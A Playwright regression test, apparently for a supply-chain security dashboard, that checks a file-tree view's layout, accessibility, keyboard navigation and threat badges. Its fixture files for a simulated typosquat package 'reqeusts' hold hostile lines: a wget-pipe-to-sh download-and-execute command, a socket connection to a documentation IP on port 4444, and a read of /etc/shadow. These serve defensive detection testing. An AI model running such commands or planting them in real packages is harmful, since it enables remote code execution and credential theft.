/* 11/04f 파일 트리(U.fileTree) 회귀 — 파일 디렉터리 구조를 보는 2곳
   ① 공급망 검사 「코드 보기」: 위협 파일 경로(d.files 키)를 폴더 트리로(왼쪽 트리 · 오른쪽 코드 창, 768 미만은 트리가 위) — 위협 개수 배지 · 위협 폴더 처음부터 펼침 · 선택 = 코드 창 파일명 · 딥링크(위협 목록 → 그 줄) 유지
   ② 증거 시트 「파일 변경」(docker diff): 폴더 트리 + 파일마다 A · C · D 배지(기존 색 — 추가 ok · 변경 warn · 삭제 danger)
   모양: 카드(1px · 반경 8 · 패딩 · 옅은 그림자) · 하위 들여쓰기 11 + 세로 연결선 1px · 항목 앞 가로 연결선 11px · 행 28 · 패딩 4/8 · 반경 4 · 14px · hover 옅은 배경 · 선택 옅은 배경 + 500 · 아이콘 16px 보조색
   펼침/접힘: grid-template-rows 0fr ↔ 1fr(--t-slow), reduced-motion 이면 즉시. 접근성: tree · treeitem · group · aria-expanded · aria-selected · ↑↓ · →← · Enter/Space · 포커스 링
   실행: (mock/ 에서) python3 -m http.server 8768 --bind 127.0.0.1 → BASE=http://127.0.0.1:8768 PLAYWRIGHT=<playwright 경로> node tests/tree-1104.cjs
         (VERBOSE=1 · ONLY=정규식 · SHOTS=1 → screenshots/tree-1104-*.png) */
const fs = require('fs');
const path = require('path');
const { chromium } = require(process.env.PLAYWRIGHT || 'playwright');
const BASE = (process.env.BASE || 'http://127.0.0.1:8768').replace(/\/index\.html$/, '').replace(/\/$/, '') + '/index.html';
const SHOTS = process.env.SHOTS === '1';
const SHOT_DIR = path.join(__dirname, '..', 'screenshots');
const results = []; const consoleErrors = [];
const T = async (name, fn) => {
  if (process.env.ONLY && !new RegExp(process.env.ONLY).test(name)) return;
  try { await fn(); results.push([true, name]); } catch (e) { results.push([false, name, e.message.split('\n')[0]]); }
  if (process.env.VERBOSE) { const r = results[results.length - 1]; console.log(`${r[0] ? 'PASS' : 'FAIL'}  ${r[1]}${r[2] ? '  — ' + r[2] : ''}`); }
};
const ok = (c, m) => { if (!c) throw new Error(m); };
const W = { timeout: 8000 };
const CODE = '.sheet [data-part="code"]';
const TREE = `${CODE} [role="tree"]`;
const item = (p) => `${TREE} [role="treeitem"][data-path="${p}"]`;
const row = (p) => `${item(p)} > .ft-row`;
// 위협 파일 3개(폴더 2단) — setup.py(픽스처, 위협 3) · reqeusts/__init__.py(위협 1) · reqeusts/utils/net.py(위협 2)
const EXTRA = {
  'reqeusts/__init__.py': ['"""데모 — 무해한 시뮬레이션"""', 'import os', 'os.system("wget -q -O- http://203.0.113.7/x | sh")', ''].join('\n'),
  'reqeusts/utils/net.py': ['import socket', 's = socket.create_connection(("203.0.113.7", 4444))', 'open("/etc/shadow").close()', ''].join('\n'),
};
const EXTRA_FINDINGS = [
  { rule: 'download-exec', category: 'threat', message: '내려받아 바로 실행', file: 'reqeusts/__init__.py', line: 3, match: 'wget -q' },
  { rule: 'threat-network-exfiltration', category: 'threat', message: '의심 IP 로 연결', file: 'reqeusts/utils/net.py', line: 2, match: '203.0.113.7' },
  { rule: 'threat-filesystem-read', category: 'threat', message: '민감 파일 접근', file: 'reqeusts/utils/net.py', line: 3, match: '/etc/shadow' },
];

(async () => {
  const br = await chromium.launch();
  const newPage = async (opts = {}) => {
    const ctx = await br.newContext(Object.assign({ viewport: { width: 1440, height: 900 } }, opts));
    const pg = await ctx.newPage();
    await pg.route('https://api.osv.dev/**', (r) => r.fulfill({ status: 200, contentType: 'application/json', headers: { 'Access-Control-Allow-Origin': '*' }, body: '{}' }));
    pg.on('console', (m) => { if (m.type() === 'error') consoleErrors.push(`${pg.url()} ${m.text()}`); });
    pg.on('pageerror', (e) => consoleErrors.push(`${pg.url()} PAGEERROR ${e.message}`));
    pg.done = () => ctx.close();
    return pg;
  };
  const go = async (pg, hash) => { await pg.goto(`${BASE}?source=sim&as=admin#${hash}`); await pg.waitForSelector('.page-title', W); await pg.waitForTimeout(400); };
  const nav = async (pg, hash) => { await pg.evaluate((x) => { location.hash = x; }, hash); await pg.waitForTimeout(500); };
  const shot = async (pg, name) => { if (!SHOTS) return; fs.mkdirSync(SHOT_DIR, { recursive: true }); await pg.waitForTimeout(400); await pg.screenshot({ path: path.join(SHOT_DIR, `tree-1104-${name}.png`) }); };
  async function openScan(pg) {
    await go(pg, '/scans');
    const id = await pg.evaluate(async () => (await UI.api.startScan({ kind: 'package', manager: 'pip', name: 'reqeusts' })).id);
    await pg.waitForFunction((i) => { const s = UI.state.scans.find((x) => x.id === i); return s && s.status === 'done'; }, id, W);
    await pg.evaluate(([i, files, fs2]) => { const s = UI.state.scans.find((x) => x.id === i); Object.assign(s.files, files); s.findings.push(...fs2); s.threats = s.findings.filter((f) => f.category === 'threat').length; }, [id, EXTRA, EXTRA_FINDINGS]);
    await nav(pg, `#/scans?id=${id}`);
    await pg.waitForSelector(TREE, W);
    await pg.waitForTimeout(400);
    return id;
  }
  async function openEvidence(pg) {
    await go(pg, '/audit');
    const id = await pg.evaluate(() => UI.runInstallDemo('malicious'));
    await pg.waitForFunction((i) => { const s = UI.state.installs.find((x) => x.id === i); return s && s.finishedAt; }, id, W);
    await pg.waitForTimeout(300);
    const aid = await pg.evaluate((i) => { const s = UI.state.installs.find((x) => x.id === i); return UI.state.audit.find((a) => a.event.containerName === s.container && UI.levelOf(a) === 'killed').id; }, id);
    await nav(pg, `#/audit?id=${aid}`);
    await pg.waitForSelector('.sheet[data-sheet="audit"] [data-tab="evidence"]', W);
    await pg.click('.sheet [data-tab="evidence"]');
    await pg.waitForSelector('[data-part="evidence-logs"]', W);
  }
  const visible = (pg) => pg.$$eval(`${TREE} [role="treeitem"]`, (els) => els.filter((e) => e.getClientRects().length && !e.closest('[aria-expanded="false"] > .ft-kids')).map((e) => e.dataset.path));
  const focused = (pg) => pg.evaluate(() => (document.activeElement && document.activeElement.dataset.path) || null);
  const codeName = (pg) => pg.$eval(`${CODE} .code-win .cw-name`, (e) => e.textContent);

  await T('1 구조: tree · group · treeitem, 폴더 먼저 · 이름순, 카드 · 들여쓰기 11 · 세로선 1px · 가로선 11px · 행 28 · 패딩 4/8 · 반경 4 · 14px · 아이콘 16px 보조색', async () => {
    const pg = await newPage();
    await openScan(pg);
    const order = await pg.$$eval(`${TREE} [role="treeitem"]`, (els) => els.map((e) => [e.dataset.path, e.dataset.kind, e.getAttribute('aria-level'), e.getAttribute('aria-expanded')]));
    ok(JSON.stringify(order.map((x) => x[0])) === JSON.stringify(['reqeusts', 'reqeusts/utils', 'reqeusts/utils/net.py', 'reqeusts/__init__.py', 'setup.py']), `순서 ${JSON.stringify(order)}`);
    ok(order.filter((x) => x[1] === 'dir').every((x) => x[3] === 'true') && order.filter((x) => x[1] === 'file').every((x) => x[3] === null), `펼침 표시 ${JSON.stringify(order)}`);
    ok(JSON.stringify(order.map((x) => x[2])) === JSON.stringify(['1', '2', '3', '2', '1']), `aria-level ${JSON.stringify(order)}`);
    ok(await pg.$eval(TREE, (t) => !!t.getAttribute('aria-label')), 'tree aria-label');
    ok(await pg.locator(`${item('reqeusts/utils')} > .ft-kids > [role="group"] > ${'[role="treeitem"]'}[data-path="reqeusts/utils/net.py"]`).count() === 1, 'net.py 가 utils 그룹 안에 없음');
    const m = await pg.evaluate(([T, net]) => {
      const cs = getComputedStyle, card = document.querySelector(T).closest('.ftree');
      const g = document.querySelector('[role="treeitem"][data-path="reqeusts"] > .ft-kids > [role="group"]');
      const li = document.querySelector(net), r = li.querySelector('.ft-row'), ico = r.querySelector('.ft-ico'), bef = cs(li, '::before');
      return { card: [cs(card).borderTopWidth, cs(card).borderTopStyle, cs(card).borderTopLeftRadius, cs(card).boxShadow !== 'none', parseFloat(cs(card).paddingTop) > 0],
        group: [cs(g).marginLeft, cs(g).borderLeftWidth, cs(g).borderLeftStyle], before: [bef.content !== 'none', bef.width, bef.height, bef.position],
        row: [r.getBoundingClientRect().height, cs(r).paddingTop, cs(r).paddingLeft, cs(r).borderTopLeftRadius, cs(r).fontSize], ico: [ico.getBoundingClientRect().width, cs(ico).fontSize, cs(ico).color],
        text3: (() => { const t = document.createElement('i'); t.style.color = 'var(--text-3)'; document.body.append(t); const c = cs(t).color; t.remove(); return c; })() };
    }, [TREE, item('reqeusts/utils/net.py')]);
    ok(m.card[0] === '1px' && m.card[1] === 'solid' && m.card[2] === '8px' && m.card[3] && m.card[4], `카드 ${JSON.stringify(m.card)}`);
    ok(m.group[0] === '11px' && m.group[1] === '1px' && m.group[2] === 'solid', `들여쓰기 · 세로선 ${JSON.stringify(m.group)}`);
    ok(m.before[0] && m.before[1] === '11px' && m.before[2] === '1px' && m.before[3] === 'absolute', `가로선 ${JSON.stringify(m.before)}`);
    ok(Math.round(m.row[0]) === 28 && m.row[1] === '4px' && m.row[2] === '8px' && m.row[3] === '4px' && m.row[4] === '14px', `행 ${JSON.stringify(m.row)}`);
    ok(Math.round(m.ico[0]) === 16 && m.ico[1] === '16px' && m.ico[2] === m.text3, `아이콘 ${JSON.stringify(m.ico)} / ${m.text3}`);
    await shot(pg, 'scan');
    await pg.done();
  });

  await T('2 위협 폴더 기본 펼침 · 파일마다 위협 개수 배지 · 처음 선택 = 첫 파일 = 코드 창 파일명', async () => {
    const pg = await newPage();
    await openScan(pg);
    const badges = await pg.$$eval(`${TREE} [role="treeitem"][data-kind="file"]`, (els) => els.map((e) => [e.dataset.path, (e.querySelector(':scope > .ft-row .ft-badge') || {}).textContent || null]));
    ok(JSON.stringify(badges) === JSON.stringify([['reqeusts/utils/net.py', '2'], ['reqeusts/__init__.py', '1'], ['setup.py', '3']]), `배지 ${JSON.stringify(badges)}`);
    ok(JSON.stringify(await visible(pg)) === JSON.stringify(['reqeusts', 'reqeusts/utils', 'reqeusts/utils/net.py', 'reqeusts/__init__.py', 'setup.py']), '처음부터 다 펼침 아님');
    ok(await pg.$eval(item('setup.py'), (e) => e.getAttribute('aria-selected')) === 'true' && await codeName(pg) === 'setup.py', '처음 선택');
    ok(await pg.locator(`${TREE} [aria-selected="true"]`).count() === 1, '선택 1개');
    await pg.done();
  });

  await T('3 펼침/접힘: grid-template-rows 0fr ↔ 1fr 끝 상태 · 전환 --t-slow · 접힌 항목은 안 보임 / reduced-motion 이면 즉시', async () => {
    for (const rm of ['no-preference', 'reduce']) {
      const pg = await newPage({ reducedMotion: rm });
      await openScan(pg);
      const kids = `${item('reqeusts/utils')} > .ft-kids`;
      const dur = await pg.$eval(kids, (e) => parseFloat(getComputedStyle(e).transitionDuration));
      if (rm === 'reduce') ok(dur < 0.02, `reduced-motion 전환 ${dur}`); else ok(Math.abs(dur - 0.32) < 0.001, `전환 ${dur}`);
      ok(await pg.$eval(kids, (e) => getComputedStyle(e).transitionProperty).then((p) => /grid-template-rows|all/.test(p)), '전환 속성');
      await pg.click(row('reqeusts/utils'));
      await pg.waitForTimeout(rm === 'reduce' ? 60 : 700);
      const shut = await pg.$eval(kids, (e) => [e.parentElement.getAttribute('aria-expanded'), getComputedStyle(e).gridTemplateRows, Math.round(e.getBoundingClientRect().height), getComputedStyle(e.firstElementChild).visibility]);
      ok(shut[0] === 'false' && shut[1] === '0px' && shut[2] === 0 && shut[3] === 'hidden', `접힘 끝 ${JSON.stringify(shut)}`);
      ok(!(await visible(pg)).includes('reqeusts/utils/net.py'), '접힌 파일이 보임');
      await pg.click(row('reqeusts/utils'));
      await pg.waitForTimeout(rm === 'reduce' ? 60 : 700);
      const open = await pg.$eval(kids, (e) => [e.parentElement.getAttribute('aria-expanded'), parseFloat(getComputedStyle(e).gridTemplateRows), Math.round(e.getBoundingClientRect().height), getComputedStyle(e.firstElementChild).visibility]);
      ok(open[0] === 'true' && open[1] >= 28 && open[2] >= 28 && open[3] === 'visible', `펼침 끝 ${JSON.stringify(open)}`);
      await pg.done();
    }
  });

  await T('4 선택 → 코드 창 파일명 · 줄 · 선택 행 옅은 배경 + 500 · hover 옅은 배경', async () => {
    const pg = await newPage();
    await openScan(pg);
    await pg.click(row('reqeusts/utils/net.py')); await pg.waitForTimeout(300);
    ok(await codeName(pg) === 'reqeusts/utils/net.py', `코드 창 ${await codeName(pg)}`);
    ok(await pg.locator(`${CODE} .code-win .code-line`).count() === 4 && await pg.locator(`${CODE} .code-win .code-line.hl-threat`).count() === 2, '코드 줄 · 위협 줄');
    ok(await pg.$eval(item('reqeusts/utils/net.py'), (e) => e.getAttribute('aria-selected')) === 'true' && await pg.$eval(item('setup.py'), (e) => e.getAttribute('aria-selected')) === 'false', '선택 표시');
    const st = await pg.evaluate(([s, o]) => { const a = document.querySelector(s), b = document.querySelector(o); return [getComputedStyle(a).fontWeight, getComputedStyle(a).backgroundColor, getComputedStyle(b).backgroundColor]; }, [row('reqeusts/utils/net.py'), row('setup.py')]);
    ok(st[0] === '500' && st[1] !== st[2] && st[1] !== 'rgba(0, 0, 0, 0)', `선택 행 ${JSON.stringify(st)}`);
    await pg.hover(row('setup.py')); await pg.waitForTimeout(250);
    ok(await pg.$eval(row('setup.py'), (e) => getComputedStyle(e).backgroundColor) !== 'rgba(0, 0, 0, 0)', 'hover 배경 없음');
    await pg.done();
  });

  await T('5 딥링크: 위협 목록 → 그 파일 선택 · 접힌 부모도 펼침 · 그 줄 강조(focus)', async () => {
    const pg = await newPage();
    await openScan(pg);
    await pg.click(row('reqeusts')); await pg.waitForTimeout(400);
    ok(await pg.$eval(item('reqeusts'), (e) => e.getAttribute('aria-expanded')) === 'false', '접힘');
    await pg.click('.sheet [data-finding][data-loc="reqeusts/utils/net.py:3"]'); await pg.waitForTimeout(500);
    ok(await codeName(pg) === 'reqeusts/utils/net.py', `코드 창 ${await codeName(pg)}`);
    ok(await pg.$eval(item('reqeusts'), (e) => e.getAttribute('aria-expanded')) === 'true' && await pg.$eval(item('reqeusts/utils'), (e) => e.getAttribute('aria-expanded')) === 'true', '부모가 펼쳐지지 않음');
    ok(await pg.$eval(item('reqeusts/utils/net.py'), (e) => e.getAttribute('aria-selected')) === 'true', '트리 선택');
    ok(await pg.locator(`${CODE} .code-line.focus[data-line="3"]`).count() === 1, '그 줄 강조');
    // 사용자가 접은 폴더는 다른 파일을 골라도 접힌 채
    await pg.click(row('reqeusts/utils')); await pg.waitForTimeout(400);
    await pg.click(row('setup.py')); await pg.waitForTimeout(400);
    ok(await pg.$eval(item('reqeusts/utils'), (e) => e.getAttribute('aria-expanded')) === 'false', '다시 그린 뒤 접힘이 풀림');
    await pg.done();
  });

  await T('6 키보드: 한 칸만 Tab(선택 항목) · ↑↓ 이동 · ← 부모/접힘 · → 펼침/첫 자식 · Enter 선택 · Space 폴더 토글 · 포커스 링', async () => {
    const pg = await newPage();
    await openScan(pg);
    const tabs = await pg.$$eval(`${TREE} [role="treeitem"]`, (els) => els.map((e) => e.getAttribute('tabindex')));
    ok(tabs.filter((t) => t === '0').length === 1 && tabs[4] === '0', `tabindex ${JSON.stringify(tabs)}`);
    await pg.focus(item('setup.py'));
    const ring = await pg.$eval(row('setup.py'), (e) => [getComputedStyle(e).outlineStyle, getComputedStyle(e).outlineWidth, getComputedStyle(e).boxShadow]);
    ok((ring[0] !== 'none' && parseFloat(ring[1]) >= 2) || ring[2] !== 'none', `포커스 링 ${JSON.stringify(ring)}`);
    const keys = async (...ks) => { for (const k of ks) { await pg.keyboard.press(k); await pg.waitForTimeout(80); } };
    await keys('ArrowUp'); ok(await focused(pg) === 'reqeusts/__init__.py', `↑ ${await focused(pg)}`);
    await keys('ArrowUp'); ok(await focused(pg) === 'reqeusts/utils/net.py', `↑↑ ${await focused(pg)}`);
    await keys('ArrowLeft'); ok(await focused(pg) === 'reqeusts/utils', `← 부모 ${await focused(pg)}`);
    await keys('ArrowLeft'); ok(await pg.$eval(item('reqeusts/utils'), (e) => e.getAttribute('aria-expanded')) === 'false' && await focused(pg) === 'reqeusts/utils', '← 접힘');
    await keys('ArrowDown'); ok(await focused(pg) === 'reqeusts/__init__.py', `접힌 뒤 ↓ ${await focused(pg)}`);
    await keys('ArrowUp', 'ArrowRight'); ok(await pg.$eval(item('reqeusts/utils'), (e) => e.getAttribute('aria-expanded')) === 'true', '→ 펼침');
    await keys('ArrowRight'); ok(await focused(pg) === 'reqeusts/utils/net.py', `→ 첫 자식 ${await focused(pg)}`);
    await keys('Enter'); await pg.waitForTimeout(300);
    ok(await codeName(pg) === 'reqeusts/utils/net.py' && await focused(pg) === 'reqeusts/utils/net.py', `Enter 선택 ${await codeName(pg)} · 포커스 ${await focused(pg)}`);
    await keys('ArrowUp', ' '); await pg.waitForTimeout(100);
    ok(await pg.$eval(item('reqeusts/utils'), (e) => e.getAttribute('aria-expanded')) === 'false', 'Space 토글');
    await pg.done();
  });

  await T('7 증거 「파일 변경」: 폴더 트리 + 파일마다 A · C · D 배지(기존 색)', async () => {
    const pg = await newPage();
    await openEvidence(pg);
    const T2 = '[data-part="evidence"] [data-part="evidence-changes"]';
    ok(await pg.$eval(T2, (e) => e.getAttribute('role') === 'tree' || !!e.querySelector('[role="tree"]')), '증거 트리 없음');
    const files = await pg.$$eval(`${T2} [role="treeitem"][data-diff]`, (els) => els.map((e) => [e.dataset.path, e.dataset.diff, e.querySelector(':scope > .ft-row .ft-badge').textContent, getComputedStyle(e.querySelector(':scope > .ft-row .ft-badge')).color]));
    ok(JSON.stringify(files.map((f) => [f[0], f[1], f[2]])) === JSON.stringify([['/root/.cache/pip', 'C', 'C'], ['/tmp/pip-install-7q2m/reqeusts/setup.py', 'A', 'A'], ['/tmp/postinstall.sh', 'A', 'A']]), `증거 파일 ${JSON.stringify(files)}`);
    const tok = await pg.evaluate(() => ['--ok', '--warn', '--danger'].map((v) => { const t = document.createElement('i'); t.style.color = `var(${v})`; document.body.append(t); const c = getComputedStyle(t).color; t.remove(); return c; }));
    ok(files.find((f) => f[1] === 'A')[3] === tok[0] && files.find((f) => f[1] === 'C')[3] === tok[1], `배지 색 ${JSON.stringify(files.map((f) => f[3]))} / ${tok}`);
    const dirs = await pg.$$eval(`${T2} [role="treeitem"][data-kind="dir"]`, (els) => els.map((e) => [e.dataset.path, e.getAttribute('aria-expanded')]));
    ok(dirs.length >= 3 && dirs.every((d) => d[1] === 'true'), `폴더 ${JSON.stringify(dirs)}`);
    ok((await pg.textContent('.sheet [data-part="evidence"] h3:has-text("파일 변경")')).includes('3'), '제목 개수');
    await shot(pg, 'evidence');
    await pg.done();
  });

  await T('8 다크: 카드 · 선택 배경 · 아이콘 보조색 · 글자 대비', async () => {
    const pg = await newPage({ colorScheme: 'dark' });
    await openScan(pg);
    const d = await pg.evaluate(([T, sel, other]) => {
      const cs = getComputedStyle, card = document.querySelector(T).closest('.ftree'), tok = (v) => { const t = document.createElement('i'); t.style.color = `var(${v})`; document.body.append(t); const c = cs(t).color; t.remove(); return c; };
      const rgb = (c) => (String(c).match(/[\d.]+/g) || []).slice(0, 3).map(Number);
      const lum = ([r, g, b]) => { const f = (v) => { v /= 255; return v <= 0.03928 ? v / 12.92 : Math.pow((v + 0.055) / 1.055, 2.4); }; return 0.2126 * f(r) + 0.7152 * f(g) + 0.0722 * f(b); };
      const name = document.querySelector(other).querySelector('.ft-name');
      const a = lum(rgb(cs(card).backgroundColor)), b = lum(rgb(cs(name).color));
      return { theme: document.documentElement.dataset.theme, cardBg: cs(card).backgroundColor, surface: (() => { const t = document.createElement('i'); t.style.background = 'var(--surface)'; document.body.append(t); const c = cs(t).backgroundColor; t.remove(); return c; })(),
        sel: cs(document.querySelector(sel)).backgroundColor, contrast: (Math.max(a, b) + 0.05) / (Math.min(a, b) + 0.05), ico: cs(document.querySelector(other).querySelector('.ft-ico')).color, text3: tok('--text-3') };
    }, [TREE, row('setup.py'), row('reqeusts/__init__.py')]);
    ok(d.theme === 'dark' && d.cardBg === d.surface, `카드 ${JSON.stringify(d)}`);
    ok(d.sel !== d.cardBg && d.sel !== 'rgba(0, 0, 0, 0)', `선택 배경 ${d.sel}`);
    ok(d.contrast >= 4.5 && d.ico === d.text3, `대비 ${d.contrast.toFixed(2)} · 아이콘 ${d.ico}`);
    await shot(pg, 'dark');
    await pg.done();
  });

  await T('9 배치: 1440 은 트리 왼쪽 · 코드 오른쪽 / 390 은 트리가 코드 위 · 넘침 0', async () => {
    for (const vp of [{ width: 1440, height: 900 }, { width: 390, height: 844 }]) {
      const pg = await newPage({ viewport: vp });
      await openScan(pg);
      const r = await pg.evaluate(([T, C]) => { const t = document.querySelector(T).closest('.ftree').getBoundingClientRect(), c = document.querySelector(C).getBoundingClientRect(); return { t: [t.left, t.right, t.top, t.bottom], c: [c.left, c.right, c.top, c.bottom], over: document.documentElement.scrollWidth - innerWidth }; }, [TREE, `${CODE} .code-win`]);
      if (vp.width > 767) ok(r.t[1] <= r.c[0] && Math.abs(r.t[2] - r.c[2]) < 2, `1440 배치 ${JSON.stringify(r)}`);
      else { ok(r.t[3] <= r.c[2], `390 배치 ${JSON.stringify(r)}`); ok(r.t[1] <= vp.width && r.c[1] <= vp.width, `390 넘침 ${JSON.stringify(r)}`); await shot(pg, 'mobile'); }
      ok(r.over <= 0, `가로 넘침 ${r.over}`);
      await pg.done();
    }
  });

  await T('9b [11/04f] 위협 목록: 폴더 안 파일은 「파일이름:줄」만 보이고 전체 경로는 툴팁 · 줄 번호가 잘리지 않는다', async () => {
    const pg = await newPage();
    await openScan(pg);
    const rows = await pg.$$eval('[data-part="findings"] [data-finding]', (els) => els.map((e) => { const a = e.firstElementChild; return { loc: e.dataset.loc, text: a.textContent, title: a.title, clipped: a.scrollWidth > a.clientWidth + 1 }; }));
    const deep = rows.filter((r) => r.loc.includes('/'));
    ok(deep.length > 0, '폴더 안 위협 행이 없음');
    for (const r of deep) {
      const base = r.loc.split('/').pop();
      ok(r.text === base && r.title === r.loc && !r.clipped, `행 ${JSON.stringify(r)}`);
    }
    await pg.done();
  });

  await T('콘솔 오류 0', async () => { ok(consoleErrors.length === 0, consoleErrors.slice(0, 3).join(' | ')); });

  await br.close();
  const pass = results.filter((r) => r[0]).length;
  for (const r of results) if (!r[0]) console.log(`FAIL  ${r[1]}  — ${r[2]}`);
  console.log(`tree-1104: ${pass}/${results.length}`);
  process.exit(pass === results.length ? 0 : 1);
})();
